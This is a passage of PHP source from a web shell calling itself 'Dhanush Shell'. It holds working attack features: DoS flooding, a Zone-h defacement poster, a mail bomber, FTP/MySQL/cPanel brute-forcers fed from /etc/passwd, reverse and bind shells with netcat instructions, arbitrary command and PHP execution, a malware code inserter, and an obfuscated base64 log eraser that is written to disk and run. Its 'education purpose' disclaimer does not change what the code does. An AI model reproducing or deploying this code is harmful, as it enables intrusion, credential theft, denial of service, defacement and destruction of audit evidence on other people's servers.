                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="box" name="time" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message (The message Should be long and it will be multiplied with the value after it)
                    </td>
                    <td>
                        <input class="box" name="message" value="%S%x--Some Garbage here --%x%S" onFocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onBlur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="box" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="button" onClick="dos('fuzzer',myip.value,port.value,time.value,times.value,message.value,messageMultiplier.value)" class="but" value="  Submit  "/>
                    </td>
                </tr>
            </table>            
        </form><div id="showdos"></div>
        <?php
}
// Zone-h Poster
	else if(isset($_GET["zone"]))
	{  
		if(!function_exists('curl_version'))
		{
			echo "<pre style='margin-top:5px'><center><font >PHP CURL NOT EXIST</font></center></pre>";
		}
		?>
		<center><font size="4" color="#FF0000">Zone-h Poster</font></center>
		<form action="<?php echo $self; ?>" method="post">
		<table align="center" cellpadding="5" border="0">
		<tr>
		<td>
		<input type="text" name="defacer" value="Attacker" class="box" /></td></tr>
		<tr><td>
		<select name="hackmode" class="box">
			<option >--------SELECT--------</option>
			<option value="1">known vulnerability (i.e. unpatched system)</option>
			<option value="2" >undisclosed (new) vulnerability</option>
			<option value="3" >configuration / admin. mistake</option>
			<option value="4" >brute force attack</option>
			<option value="5" >social engineering</option>
			<option value="6" >Web Server intrusion</option>
			<option value="7" >Web Server external module intrusion</option>
			<option value="8" >Mail Server intrusion</option>
			<option value="9" >FTP Server intrusion</option>
			<option value="10" >SSH Server intrusion</option>
			<option value="11" >Telnet Server intrusion</option>
			<option value="12" >RPC Server intrusion</option>
			<option value="13" >Shares misconfiguration</option>
			<option value="14" >Other Server intrusion</option>
			<option value="15" >SQL Injection</option>
			<option value="16" >URL Poisoning</option>
			<option value="17" >File Inclusion</option>
			<option value="18" >Other Web Application bug</option>
			<option value="19" >Remote administrative panel access bruteforcing</option>
			<option value="20" >Remote administrative panel access password guessing</option>
			<option value="21" >Remote administrative panel access social engineering</option>
			<option value="22" >Attack against administrator(password stealing/sniffing)</option>
			<option value="23" >Access credentials through Man In the Middle attack</option>
			<option value="24" >Remote service password guessing</option>
			<option value="25" >Remote service password bruteforce</option>
			<option value="26" >Rerouting after attacking the Firewall</option>
			<option value="27" >Rerouting after attacking the Router</option>
			<option value="28" >DNS attack through social engineering</option>
			<option value="29" >DNS attack through cache poisoning</option>
			<option value="30" >Not available</option>
		</select>
		</td></tr>
		<tr><td>
		<select name="reason" class="box">
			<option >--------SELECT--------</option>
			<option value="1" >Heh...just for fun!</option>
			<option value="2" >Revenge against that website</option>
			<option value="3" >Political reasons</option>
			<option value="4" >As a challenge</option>
			<option value="5" >I just want to be the best defacer</option>
			<option value="6" >Patriotism</option>
			<option value="7" >Not available</option>
		</select></td></tr>
		<tr><td>
		<textarea name="domain" class="box" cols="47" rows="9">List Of Domains</textarea></td></tr>
		<tr><td>
		<input type="button" onClick="zoneh(defacer.value,hackmode.value,reason.value,domain.value)" class="but" value="Send Now !" /></td></tr></table>
		</form><div id="showzone"></div>
	<?php }
//DDos
	else if(isset($_GET['dos']))
	{ 
		?>
			<form method="GET">
				<table id="margins">
					<tr>
						<td width="400" class="title">
							IP
						</td>
						<td>
							<input class="box" name="myip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Port
						</td>
						<td>
							<input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Timeout <font >(Time in seconds)</font>
						</td>
						<td>
							<input type="text" class="box" name="timeout" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';" />
						</td>
					</tr>
					<tr>
				<td class="title">
					Execution Time <font >(Time in seconds)</font> 
				</td>
				<td>
					<input type="text" class="box" name="exTime" value="10" onFocus="if(this.value == '10')this.value = '';" onBlur="if(this.value=='')this.value='10';"/>
				</td>
			</tr>
			<tr>
				<td class="title">
					No of Bytes per/packet
				</td>
				<td>
					<input type="text" class="box" name="noOfBytes" value="999999" onFocus="if(this.value == '999999')this.value = '';" onBlur="if(this.value=='')this.value='999999';"/>
				</td>
			</tr>
			<tr>
				<td rowspan="2">
					<input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="button" onClick="dos('dosser',myip.value,port.value,timeout.value,exTime.value,noOfBytes.value,'null')" class="but" value="   Attack >> "/>
				</td>
			</tr>
		</table>            
	</form><div id="showdos"></div>
	<?php
}
else if(isset($_GET['mailbomb']))
{ ?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('bomb')"><font class=txt size="4">| Mail Bomber |</font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('mail')"><font class=txt size="4">| Mass Mailer |</font></a></td></tr></table></center><br><div id=showdata></div>
<?php
}
else if(isset($_GET['tools']))
	{ 
		?>
		<center><br><form onSubmit="getport(host.value,protocol.value);return false;">
		<table cellpadding="5" border="3" style="border-color:#333333; width:50%;">
			<tr>
				<td colspan="2" align="center"><b><font size='4' color="#FF0000">Port Scanner<br></font></b></td>
	   		</tr>
			<tr>
				<td align="center">
	   			<input class="sbox" type='text' name='host' value='<?php echo $_SERVER["SERVER_ADDR"]; ?>' >
				</td>
	   			<td align="center">
				<select class="sbox" name='protocol'>
	   				<option value='tcp'>tcp</option>
	   				<option value='udp'>udp</option>
	   			</select>
				</td>
	   		<tr>
			<td colspan="2" align="center"><input class="but" type='button' onClick="getport(host.value,protocol.value)" value='Scan Ports'></td>
			</tr>
			</form>
			<tr><td colspan=2><div id="showports"></div>
		</td></tr></table>
		
		<br>
		<form onSubmit="bruteforce(prototype.value,serverport.value,login.value,dict.value);return false;">
		<table cellpadding="5" border="2" style="border-color:#333333; width:50%;">
			<tr>
				<td colspan="2" align="center"><font size="4">BruteForce</font></td>
			</tr>
			<tr>
				<td>Type : </td>
				<td>
					<select name="prototype" class="sbox">
						<option value="ftp">FTP</option>
						<option value="mysql">MYSQL</option>
						<option value="postgresql">PostgreSql</option>
					</select>
				</td>
			</tr>
			<tr>
				<td>Server <b>:</b> Port : </td>
				<td><input type="text" name="serverport" value="<?php echo $_SERVER["SERVER_ADDR"]; ?>" class="sbox"></td>
			</tr>
			<tr>
				<td valign="middle">Brute type : </td>
				<td><label><input type=radio name=mytype value="1" checked> /etc/passwd</label><label><input type=checkbox id="reverse" name=reverse value=1 checked> reverse (login -> nigol)</label><hr color="#1B1B1B">
				<label><input type=radio name=mytype value="2"> Dictionary</label><br>
				Login : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="login" value="root" class="sbox"><br>
				Dictionary : <input type="text" name="dict" value="<?php echo getcwd() . $directorysperator; ?>passwd.txt" class="sbox">
				</td>
			</tr>
			<tr>
				<td colspan="2" align="center"><input type="button" onClick="bruteforce(prototype.value,serverport.value,login.value,dict.value)" value="Attack >>" class="but"></td>
			</tr>
			</form><tr><td colspan="2" id="showbrute"></td></tr>
		</table>
		</center><br>
		<?php
}
else if (isset($_GET["phpc"]))
{
	 ?>
	 <div id="showresult"></div>
    <form name="frm">
    <textarea name="code" class="box" cols="120" rows="10">phpinfo();</textarea>
	<br /><br />
    <input name="submit" value="Execute This COde! " class="but" onClick="execode(code.value)" type="button" />
	<label><input type="checkbox" id="intext" name="intext" value="disp"> <font class=txt size="3">Display in Textarea</font></label>
    </form>
    <?php
}
else if(isset($_GET["exploit"]))
{
	if(!isset($_GET["rootexploit"]))
	{
		?>
		<center>
		<form action="<?php echo $self; ?>" method="get" target="_blank">
			<input type="hidden" name="exploit">
			<table border="1" cellpadding="5" cellspacing="4" style="width:50%;border-color:#333333;">
			<tr>
				<td style="height:60px;">
			<font size="4" class=txt>Select Website</font></td><td>
		<p><select id="rootexploit" name="rootexploit" class="box">
			<option value="exploit-db">Exploit-db</option>
			<option value="packetstormsecurity">Packetstormsecurity</option>
			<option value="exploitsearch">Exploitsearch</option>
			<option value="shodanhq">Shodanhq</option>
		</select></p></td></tr><tr><td colspan="2" align="center"  style="height:40px;">
		<input type="submit" value="Search" class="but"></td></tr></table>
		</form></center><br>
	
	<?php 
	}
	else
	{
		//exploit search
		$Lversion = php_uname(r);
		$OSV = php_uname(s);
		if(eregi('Linux',$OSV))
		{
			$Lversion=substr($Lversion,0,6);
			if($_GET['rootexploit'] == "exploit-db")
			{
				header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "packetstormsecurity")
			{
				header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "exploitsearch")
			{
				header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "shodanhq")
			{
				header("Location:http://www.shodanhq.com/exploits?q=Linux+Kernel+$Lversion");
			}
		}
		else
		{
			$Lversion=substr($Lversion,0,3);
			if($_GET['rootexploit'] == "exploit-db")
			{
				header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "packetstormsecurity")
			{
				header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "exploitsearch")
			{
				header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "shodanhq")
			{
				header("Location:http://www.shodanhq.com/exploits?q=$OSV+Lversion");
			}
		}
		//End of Exploit search
	}
}
// Connect
else if(isset($_REQUEST['connect']))
{
	?>
	<form action='<?php echo $self; ?>' method='POST' >
	<table style="width:50%" align="center" >
    <tr>
        <th colspan="1" width="50px">Reverse Shell</th>
        <th colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input type="text" class="box" style="width: 200px;" name="ip" value="<?php yourip();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 200px;" class="box" name="port" size='5' value="9891"/></td>
				</tr>
				<tr>
					<td style="vertical-align:top;">Use:</td>	
					<td><select style="width: 95px;" name="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="python">Python</option>
						<option value="php">PHP</option>
						</select>&nbsp;&nbsp;
					<input type="submit" style="width: 90px;" class="but" value="Connect!" name="backconnect"/></td>
				</tr>
            </table> </form> 
         </td>
     
         <td style="vertical-align:top;">
		 <form method='post' >
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="box" name="port" value="9891" />
                    </td>
                </tr>
                <tr>
                    <td>Password </td>
                    <td>
						<input style="width: 200px;" class="box" name="passwd" value="Dhanush"/>
					</td>
					<tr>
						<td>Using</td>
						<td>
						<select style="width: 95px;" name="lang" id="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="c">C</option>
						</select>&nbsp;&nbsp;
						<input style="width: 90px;" class="but" type="submit" name="backdoor" value=" Bind "/></td>
                </tr>
            </table>
         </td>
         </form>
    </tr>
	<tr><td colspan=2><font color="#FF0000">Click "Connect" only after open port for it.Use NetCat, run "nc -l -n -v -p 9891"!<br>Click "Bind", use netcat and give it the command 'nc <?php yourip(); ?> 9891"!</font></td></tr>
    </table>
	   
	<?php 
	}

else if(isset($_REQUEST['404']))
{
	?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('404new')"><font class=txt size="4">| Set Your 404 Page |</font></a></td>
		<td><a href=javascript:void(0) onClick="getdata('404page')"><font class=txt size="4">| Set Specified 404 Page |</font></a></td>
		</tr></table></center><br>
		<div id="showdata"></div>
	<?php 
}
else if(isset($_GET['about']))
	{ ?>
		<center>
		  <p><font  size=6><u>D h a n u s h</u></font><br>
		      <font  size=5>[--==Coded By Arjun==--]</font>
		    <div style='font-family: Courier New; font-size: 10px;'><font class=txt ><pre>

       -  --  -
       -- -- --
       --    --
       ---  ---
       ------
       ----
   ----             
 ------           
-------          
---   --          
      --      --- 
      --      ----- 
     ---      --- --- 
     ---    ---   ---
--   ---------     --
--    -------      --
 --     ----       --
  --     ---       --
  --     --        --
   ---  ---   --  ---
    ------    ------
     ----      ----
      

		</pre></font></div></center>
		<font class="txt">Dhanush Shell is a PHP Script, created for checking the vulnerability and security of any web server or website. With this PHP script, the owner can check various vulnerablities present in the web server. This shell provide you almost every facility that the security analyst need for penetration testing. This is a "All In One" php script, so that the user do not need to go anywhere else.<br> This script is coded by an Indian Ethical Hacker.<br> This script is only coded for education purpose or testing on your own server.The developer of the script is not responsible for any damage or misuse of it</font><br><br><center><font  size=5>GREETZ To All Indian Hackers</font><br><font  size=6>| &#2332;&#2351; &#2350;&#2361;&#2366;&#2325;&#2366;&#2354; | | &#2332;&#2351; &#2361;&#2367;&#2344;&#2381;&#2342; |</font></center><br>
	<?php }
else if(isset($_GET['database']))
{ ?>
	<form onSubmit="mydatabase(server.value,username.value,password.value);return false;">
	<table id="datatable" style="width:90%;" cellpadding="4" align="center">
	<tr>
		<td colspan="2">Connect To Database</td>
	</tr>
	<tr>
		<td>Server Address :</td>
		<td><input type="text" class="box" name="server" value="localhost"></td>
	</tr>
	<tr>
		<td>Username :</td>
		<td><input type="text" class="box" name="username" value="root"></td>
	</tr>
	<tr>
		<td>Password:</td>
		<td><input type="text" class="box" name="password" value=""></td>
	</tr>
	
	<tr>
		<td></td>
		<td><input type="button" onClick="mydatabase(server.value,username.value,password.value)" value="  Connect  " name="executeit" class="but"></td>
	</tr>
	</table>
	</form>
	<div id="showsql"></div>
<?php	
}
// Cpanel Cracker
	else if(isset($_REQUEST['cpanel']))
	{
		$cpanel_port="2082";
		$connect_timeout=5;
		?>
		<center>
		<form method=post>
		<table style="width:50%;border-color:#333333;" border=1 cellpadding=4>
			<tr>
				<td align=center colspan=2>Target : <input type=text name="server" value="localhost" class=sbox></td>
			</tr>
			<tr>
				<td align=center>User names</td><td align=center>Password</td>
			</tr>
			<tr>
				<td align=center><textarea name=username rows=25 cols=22 class=box><?php 
				if($os != "Windows")
				{
					if(@file('/etc/passwd'))
					{
						$users = file('/etc/passwd');
						foreach($users as $user) 
						{
							$user = explode(':', $user);
							echo $user[0] . "\n";
						}
					}
					else
					{
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						
						 $temp = trim($temp);
							 
						 if($file5 = fopen("test.txt","w"))
						 {
							fputs($file5,$temp);
							 fclose($file5);
							 
							 $file = fopen("test.txt", "r");
							 while(!feof($file))
							 {
							 	$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo $matches;
							}
							fclose($file);
						}
					}
				}

				 ?></textarea></td><td align=center><textarea name=password rows=25 cols=22 class=box></textarea></td>
			</tr>
			<tr>
				<td align=center colspan=2>Guess options : <label><input name="cracktype" type="radio" value="cpanel" checked> Cpanel(2082)</label><label><input name="cracktype" type="radio" value="ftp"> Ftp(21)</label><label><input name="cracktype" type="radio" value="telnet"> Telnet(23)</label></td>
			</tr>
			<tr>
				<td align=center colspan=2>Timeout delay : <input type="text" name="delay" value=5 class=sbox></td>
			</tr>
			<tr>
				<td align=center colspan=2><input type="submit" name="cpanelattack" value="   Go    " class=but></td>
			</tr>
		</table>
		</form>
		</center>
		<?php
}
else if(isset($_REQUEST['malattack']))
{
	?><input type="hidden" id="malpath" value="<?php echo $_GET["dir"]; ?>">
	<center><table><tr><td><a href=# onClick="getdata('malware')"><font class=txt size="4">| Malware Attack |</font></a></td>
	<td><a href=# onClick="getdata('codeinsert')"><font class=txt size="4">| Insert Own Code |</font></a></td></tr></table></center><br>
	<div id="showdata"></div>
	<?php
}
else if(isset($_GET["com"]))
{
	echo "<br>";
	ob_start();
	eval("phpinfo();");
	$b = ob_get_contents();
	ob_end_clean();
	$a = strpos($b,"<body>")+6; // yeah baby,, your body is wonderland ;-)
	$z = strpos($b,"</body>");
	$s_result = "<div class='myphp'>".substr($b,$a,$z-$a)."</div>";
	echo $s_result;
}
else if(isset($_GET['execute']))
{
	$comm = $_GET['execute'];
	chdir($_GET['executepath']);
	$check = shell_exec($comm);
	
	echo "<center><textarea id=showexecute cols=120 rows=20 class=box>" . $check . "</textarea></center>";
		
	?>
	<BR><BR><center><form onSubmit="executemyfn('<?php echo addslashes($_GET['executepath']); ?>',execute.value);return false;">
	<input type="text" class="box" name="execute">
	<input type="button" onClick="executemyfn('<?php echo addslashes($_GET['executepath']); ?>',execute.value)" value="Execute" class="but"></form></center>
	<?php
}
else if(isset($_GET['mycmd']))
{
	if($_GET['mycmd']=="logeraser")
	{
		$erase = gzinflate(base64_decode("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"));
		if(is_writable("."))
		{	
			if($openp = fopen(getcwd()."/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase);
				fclose($openp);
				passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		} else 
		{
			if($openp = fopen("/tmp/logseraser.pl", 'w'))
			{
				fwrite($openp, $erase)or die("Error");
				fclose($openp);
				$aidx = passthru("perl logseraser.pl linux");
				unlink("logseraser.pl");
				echo "<center><font color=#FFFFFF size=3>Logs Cleared</font></center>";
			}
		}
	}
	else
	{
		$check = shell_exec($_GET['mycmd']);
		echo "<center><textarea cols=120 rows=20 class=box>" . $check . "</textarea></center>";
	}
}
else if(isset($_GET['prototype'])) 
{
	echo '<h1>Results</h1><div><span>Type:</span> '.htmlspecialchars($_GET['prototype']).' <span><br>Server:</span> '.htmlspecialchars($_GET['serverport']).'<br>';
	if( $_GET['prototype'] == 'ftp' ) 
	{
		function BruteFun($ip,$port,$login,$pass) 
		{
			$fp = @ftp_connect($ip, $port?$port:21);
			if(!$fp) return false;
			$res = @ftp_login($fp, $login, $pass);
			@ftp_close($fp);
			return $res;
		}
	}
	elseif( $_GET['prototype'] == 'mysql' )
	{
		function BruteFun($ip,$port,$login,$pass) 
		{
			$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
			@mysql_close($res);
			return $res;
		}
	}
	elseif( $_GET['prototype'] == 'pgsql' )
	{
		function BruteFun($ip,$port,$login,$pass)
		{
			$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
			$res = @pg_connect($str);
			@pg_close($res);
			return $res;
		}
	}
	
	$success = 0;
	$attempts = 0;
	$server = explode(":", $_GET['server']);
	if($_GET['type'] == 1) 
	{
		$temp = @file('/etc/passwd');
		if( is_array($temp))
			foreach($temp as $line) 
			{
				$line = explode(":", $line);
				++$attempts;
				if(BruteFun(@$server[0],@$server[1], $line[0], $line[0]) ) 
				{
					$success++;
					echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
				}
				if(@$_GET['reverse']) 
				{
					$tmp = "";
					for($i=strlen($line[0])-1; $i>=0; --$i)
						$tmp .= $line[0][$i];
					++$attempts;
					if(BruteFun(@$server[0],@$server[1], $line[0], $tmp) ) 
					{
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
					}
				}
			}
	}
	elseif($_GET['type'] == 2) 
	{
		$temp = @file($_GET['dict']);
		if( is_array($temp) )
			foreach($temp as $line) 
			{
				$line = trim($line);
				++$attempts;
				if(BruteFun($server[0],@$server[1], $_GET['login'], $line) ) 
				{
					$success++;
					echo '<b>'.htmlspecialchars($_GET['login']).'</b>:'.htmlspecialchars($line).'<br>';
				}
			}
	}
	echo "<span>Attempts:</span> <font class=txt>$attempts</font> <span>Success:</span> <font class=txt>$success</font></div>";
}
// Execute Query
else if(isset($_GET["executeit"]))
{
	if(isset($_GET['username'])  && isset($_GET['server']))
	{ 
		$dbserver = $_GET['server'];
		$dbuser = $_GET['username'];
		$dbpass = $_GET['password'];
		if(mysql_connect($dbserver,$dbuser,$dbpass))
		{
			setcookie("dbserver", $dbserver);			
			setcookie("dbuser", $dbuser);
			setcookie("dbpass", $dbpass);
			
			listdatabase();
		}
		else					
			echo "cannotconnect";
	}
}
else if(isset($_GET['action']) && isset($_GET['dbname']))


	{
		if($_GET['action'] == "createDB")
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("create database $dbname",$mysqlHandle);
			listdatabase();
		}
		if($_GET['action'] == 'dropDB')
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("drop database $dbname",$mysqlHandle);
			mysql_close($mysqlHandle);
			listdatabase();
		}

		if($_GET['action'] == 'listTables')
		{
			listtable();
		}
		
		// Create Tables
		if($_GET['action'] == "createtable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("CREATE TABLE $tablename ( no INT )");
			listtable();
		}
		
		// Drop Tables
		if($_GET['action'] == "dropTable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("drop table $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "empty")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("delete from $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "dropField")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$fieldname = $_GET['fieldname'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$queryStr = "ALTER TABLE $tablename DROP COLUMN $fieldname";
			mysql_select_db( $dbname, $mysqlHandle );
			mysql_query( $queryStr , $mysqlHandle );
			listtable();
		}
		
		if($_GET['action'] == 'viewdb')
		{
			listdatabase();	
		}
		
		// View Table Schema
		if($_GET['action'] == "viewSchema")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('listTables','$dbname','$tablename')\"> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";	
			$pResult = mysql_query( "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
			echo "<br><br><table align=center cellspacing=4 style='width:80%;' border=1>";
			echo "<th>Field</th><th>Type</th><th>Null</th><th>Key</th></th>";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				echo "<tr>\n";
				echo "<td>".$field["Field"]."</td>\n";
				echo "<td>".$field["Type"]."</td>\n";
				echo "<td>".$field["Null"]."</td>\n";
